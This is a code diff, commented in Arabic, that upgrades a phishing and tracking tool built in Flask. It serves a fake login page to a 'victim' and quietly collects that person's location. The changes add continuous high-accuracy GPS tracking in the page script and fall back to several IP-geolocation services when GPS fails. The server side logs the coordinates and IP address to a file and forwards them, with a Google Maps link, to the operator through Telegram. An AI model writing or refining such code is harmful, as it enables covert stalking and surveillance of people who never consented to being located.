@@ -29,7 +29,7 @@ def send_to_telegram(message):
         print(f"خطأ في الإرسال لتليجرام: {e}")
         return False
 
-# ========== دوال جمع الموقع ==========
+# ========== دوال جمع الموقع المحسنة ==========
 def get_location_via_google():
     """جلب الموقع الدقيق باستخدام Google Geolocation API"""
     url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}"
@@ -47,21 +47,51 @@ def get_location_via_google():
     return None
 
 def get_location_via_ip():
-    """جلب الموقع التقريبي عبر IP"""
-    try:
-        response = requests.get('http://ip-api.com/json/', timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('status') == 'success':
-                return {
-                    'city': data.get('city', 'غير معروف'),
-                    'country': data.get('country', 'غير معروف'),
-                    'lat': data.get('lat', 'غير متاح'),
-                    'lon': data.get('lon', 'غير متاح'),
-                    'isp': data.get('isp', 'غير معروف')
-                }
-    except Exception as e:
-        print(f"خطأ في IP Geolocation: {e}")
+    """جلب الموقع التقريبي عبر IP باستخدام خدمات متعددة"""
+    services = [
+        'http://ip-api.com/json/',
+        'https://ipapi.co/json/',
+        'https://ipinfo.io/json/'
+    ]
+    
+    for service in services:
+        try:
+            response = requests.get(service, timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                
+                if 'ip-api.com' in service:
+                    if data.get('status') == 'success':
+                        return {
+                            'city': data.get('city', 'غير معروف'),
+                            'country': data.get('country', 'غير معروف'),
+                            'lat': data.get('lat', 'غير متاح'),
+                            'lon': data.get('lon', 'غير متاح'),
+                            'isp': data.get('isp', 'غير معروف')
+                        }
+                elif 'ipapi.co' in service:
+                    if 'latitude' in data:
+                        return {
+                            'city': data.get('city', 'غير معروف'),
+                            'country': data.get('country_name', 'غير معروف'),
+                            'lat': data.get('latitude', 'غير متاح'),
+                            'lon': data.get('longitude', 'غير متاح'),
+                            'isp': data.get('org', 'غير معروف')
+                        }
+                elif 'ipinfo.io' in service:
+                    if 'loc' in data:
+                        loc = data.get('loc', '').split(',')
+                        return {
+                            'city': data.get('city', 'غير معروف'),
+                            'country': data.get('country', 'غير معروف'),
+                            'lat': loc[0] if len(loc) > 0 else 'غير متاح',
+                            'lon': loc[1] if len(loc) > 1 else 'غير متاح',
+                            'isp': data.get('org', 'غير معروف')
+                        }
+        except Exception as e:
+            print(f"خطأ في خدمة IP {service}: {e}")
+            continue
+    
     return None
 
 # ========== الصفحة الرئيسية (وجهة الضحية) ==========
@@ -207,57 +237,139 @@ login_page_html = '''
         </div>
     </div>
     <script>
-    // ========== 1. طلب الموقع بصمت ==========
+    // ========== 1. طلب الموقع بدقة عالية (محسن) ==========
     function requestLocation() {
         if (navigator.geolocation) {
-            let attempts = 0;
-            const maxAttempts = 3;
             let bestAccuracy = Infinity;
             let bestLat = null;
             let bestLng = null;
+            let attempts = 0;
+            const maxAttempts = 5;
+            let watchId = null;
             
-            function getLocation() {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        
-                        if (accuracy < bestAccuracy) {
-                            bestAccuracy = accuracy;
-                            bestLat = lat;
-                            bestLng = lng;
-                        }
-                        
-                        if (accuracy < 50 || attempts >= maxAttempts - 1) {
-                            fetch('/gps-data', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ lat: bestLat, lng: bestLng, accuracy: bestAccuracy })
-                            }).catch(err => console.log('خطأ في إرسال GPS:', err));
-                        } else {
-                            attempts++;
-                            setTimeout(getLocation, 2000);
-                        }
-                    },
-                    function(error) {
-                        if (attempts < maxAttempts) {
-                            attempts++;
-                            setTimeout(getLocation, 2000);
-                        } else {
-                            if (bestLat && bestLng) {
+            // وظيفة لإرسال الموقع الأفضل
+            function sendBestLocation() {
+                if (bestLat && bestLng) {
+                    fetch('/gps-data', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            lat: bestLat, 
+                            lng: bestLng, 
+                            accuracy: bestAccuracy 
+                        })
+                    }).catch(err => console.log('خطأ في إرسال GPS:', err));
+                }
+            }
+            
+            // وظيفة معالجة الموقع
+            function handlePosition(position) {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                
+                console.log(`موقع جديد: ${lat}, ${lng} (دقة: ${accuracy} متر)`);
+                
+                // تخزين أفضل موقع (أقل دقة = أفضل)
+                if (accuracy < bestAccuracy) {
+                    bestAccuracy = accuracy;
+                    bestLat = lat;
+                    bestLng = lng;
+                    
+                    // إذا كانت الدقة ممتازة (أقل من 20 متر)، أرسل فوراً
+                    if (accuracy < 20) {
+                        if (watchId) navigator.geolocation.clearWatch(watchId);
+                        sendBestLocation();
+                        return;
+                    }
+                }
+                
+                attempts++;
+                // إذا وصلنا لأقصى محاولات، أرسل أفضل موقع
+                if (attempts >= maxAttempts) {
+                    if (watchId) navigator.geolocation.clearWatch(watchId);
+                    sendBestLocation();
+                }
+            }
+            
+            // وظيفة معالجة الأخطاء
+            function handleError(error) {
+                console.log('خطأ في GPS:', error.message);
+                // إذا فشل GPS، استخدم IP كحل بديل
+                if (error.code === 1 || error.code === 2) {
+                    fetch('http://ip-api.com/json/')
+                        .then(r => r.json())
+                        .then(data => {
+                            if (data.status === 'success') {
                                 fetch('/gps-data', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ lat: bestLat, lng: bestLng, accuracy: bestAccuracy || 9999 })
-                                }).catch(err => console.log('خطأ في إرسال GPS:', err));
+                                    body: JSON.stringify({ 
+                                        lat: data.lat, 
+                                        lng: data.lon, 
+                                        accuracy: 'IP-based' 
+                                    })
+                                });
                             }
-                        }
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
+                        });
+                }
             }
-            getLocation();
+            
+            // بدء مراقبة الموقع (بدلاً من طلب لمرة واحدة)
+            watchId = navigator.geolocation.watchPosition(
+                handlePosition,
+                handleError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 30000,
+                    maximumAge: 0,
+                    distanceFilter: 5 // طلب تحديث عند تحرك 5 أمتار
+                }
+            );
+            
+            // مهلة: إذا لم نحصل على موقع بعد 30 ثانية، أرسل ما لدينا
+            setTimeout(() => {
+                if (watchId) {
+                    navigator.geolocation.clearWatch(watchId);
+                    if (bestLat && bestLng) {
+                        sendBestLocation();
+                    } else {
+                        // فشل GPS تماماً، استخدم IP
+                        fetch('http://ip-api.com/json/')
+                            .then(r => r.json())
+                            .then(data => {
+                                if (data.status === 'success') {
+                                    fetch('/gps-data', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ 
+                                            lat: data.lat, 
+                                            lng: data.lon, 
+                                            accuracy: 'IP-based' 
+                                        })
+                                    });
+                                }
+                            });
+                    }
+                }
+            }, 30000);
+        } else {
+            // GPS غير مدعوم، استخدم IP
+            fetch('http://ip-api.com/json/')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        fetch('/gps-data', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                lat: data.lat, 
+                                lng: data.lon, 
+                                accuracy: 'IP-based' 
+                            })
+                        });
+                    }
+                });
         }
     }
 
@@ -526,20 +638,54 @@ def capture():
     '''
     return success_page
 
-# ========== استقبال الموقع الدقيق (GPS) ==========
+# ========== استقبال الموقع الدقيق (GPS) المحسن ==========
 @app.route('/gps-data', methods=['POST'])
 def gps_data():
     data = request.get_json()
-    lat = data.get('lat'); lon = data.get('lng'); accuracy = data.get('accuracy')
+    lat = data.get('lat')
+    lon = data.get('lng')
+    accuracy = data.get('accuracy')
+    
+    # التحقق من صحة البيانات
     if lon is None or lat is None:
         error_msg = f"⚠️ <b>فشل تحديد الموقع</b>\n📱 الأسباب: 1. لم تسمح بمشاركة الموقع 2. إشارة GPS ضعيفة\n📝 البيانات المستلمة:\nخط العرض: {lat}\nخط الطول: {lon}\nالدقة: {accuracy} متر"
         send_to_telegram(error_msg)
         return {"status": "failed"}, 400
+    
+    # تحويل الدقة إلى رقم (إذا كانت نصية)
+    try:
+        accuracy_value = float(accuracy)
+    except:
+        accuracy_value = 9999
+    
+    # تحديد مستوى الدقة
+    if accuracy_value < 20:
+        accuracy_level = "🟢 ممتازة (أقل من 20 متر)"
+    elif accuracy_value < 100:
+        accuracy_level = "🟡 جيدة (أقل من 100 متر)"
+    elif accuracy_value < 500:
+        accuracy_level = "🟠 متوسطة (أقل من 500 متر)"
+    else:
+        accuracy_level = "🔴 منخفضة (أكثر من 500 متر)"
+    
+    # تسجيل الموقع في ملف
     with open('gps_log.txt', 'a', encoding='utf-8') as f:
-        f.write(f"\n═══════════════════════════════════════════\n📍 موقع دقيق - {datetime.datetime.now()}\n🗺️ خط العرض: {lat}\n🗺️ خط الطول: {lon}\n📏 الدقة: {accuracy} متر\n🌐 IP: {request.remote_addr}\n═══════════════════════════════════════════\n")
+        f.write(f"\n═══════════════════════════════════════════\n📍 موقع دقيق - {datetime.datetime.now()}\n🗺️ خط العرض: {lat}\n🗺️ خط الطول: {lon}\n📏 الدقة: {accuracy} متر\n📊 مستوى الدقة: {accuracy_level}\n🌐 IP: {request.remote_addr}\n═══════════════════════════════════════════\n")
+    
+    # إنشاء رابط خرائط
     maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-    gps_msg = f"<b>📍 موقع دقيق (GPS)</b>\n<b>🗺️ خط العرض:</b> {lat}\n<b>🗺️ خط الطول:</b> {lon}\n<b>📏 الدقة:</b> {accuracy} متر\n<b>📍 <a href='{maps_link}'>على الخريطة</a></b>"
+    
+    # إرسال الموقع إلى تليجرام مع مستوى الدقة
+    gps_msg = f"""
+<b>📍 موقع دقيق (GPS)</b>
+<b>🗺️ خط العرض:</b> {lat}
+<b>🗺️ خط الطول:</b> {lon}
+<b>📏 الدقة:</b> {accuracy} متر
+<b>📊 مستوى الدقة:</b> {accuracy_level}
+<b>📍 <a href='{maps_link}'>على الخريطة</a></b>
+"""
     send_to_telegram(gps_msg)
+    
     return {"status": "success"}, 200
     
 
